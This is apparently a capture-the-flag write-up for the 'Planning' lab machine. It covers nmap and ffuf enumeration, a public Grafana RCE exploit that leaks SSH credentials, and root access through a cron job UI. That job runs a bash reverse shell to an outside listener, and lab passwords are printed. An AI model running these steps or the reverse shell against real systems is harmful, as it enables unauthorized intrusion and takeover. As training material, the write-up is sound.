---
authors:
    - Jiri Raja
date: 08-10-2025
---
# Planning

Default credentials: `admin:0D5oT70Fq13EvB5r`

## Foothold

nmap:
```bash
nmap -sC -sV -v -p- 10.10.11.68
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Update etc hosts:

```
10.10.11.68 planning.htb
```

fuzzing:
```
ffuf -w /usr/share/wordlists/dirb/big.txt -u "http://planning.htb/FUZZ.php"                                                                   
...
about                   [Status: 200, Size: 12727, Words: 4057, Lines: 231, Duration: 31ms]
contact                 [Status: 200, Size: 10632, Words: 3537, Lines: 202, Duration: 31ms]
course                  [Status: 200, Size: 10229, Words: 2975, Lines: 195, Duration: 31ms]
detail                  [Status: 200, Size: 13006, Words: 4092, Lines: 221, Duration: 31ms]
enroll                  [Status: 200, Size: 7053, Words: 1360, Lines: 157, Duration: 32ms]
index                   [Status: 200, Size: 23914, Words: 8236, Lines: 421, Duration: 31ms]
:: Progress: [20469/20469] :: Job [1/1] :: 1282 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```

Download sec lists from <https://github.com/danielmiessler/SecLists>:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -H "Host: FUZZ.planning.htb" -u http://planning.htb -fs 178
```

We find `grafana`. Add it to etc hosts.

## User

We started the pentets with credentials, use them here.

Search google for `grafana 11.0.0 rce`. We get <https://github.com/nollium/CVE-2024-9264>. Create venv, install requirements and run it with the intent to get environment variables:

```bash
python exploit.py -u admin -p 0D5oT70Fq13EvB5r -c export http://grafana.planning.htb/
```

We get `enzo:RioTecRANDEntANT!`.

```bash
ssh enzo@planning.htb
```

Get the user flag.

## Root

list running apps:
```bash
ss -plnt
```

forward the web app:
```bash
ssh -L 8000:127.0.0.1:8000 tobias@planning.htb
```

check opt:
```bash
cat /opt/crontabs/crontab.db
```

```
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh","schedule":"* * * * *","stopped":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740849309992,"saved":false,"_id":"gNIRXh1WIc9K7BYX"}
```

Use the pasword at localhost:8000: `root:P4ssw0rdS0pRi0T3c`.

Create a new job with the command:
```bash
/bin/bash -c 'bash -i > /dev/tcp/10.10.14.5/1234 0>&1'
```

Start a reverse shell:
```bash
nc -nvlp 1234
```

And trigger the job.

Get the root flag.
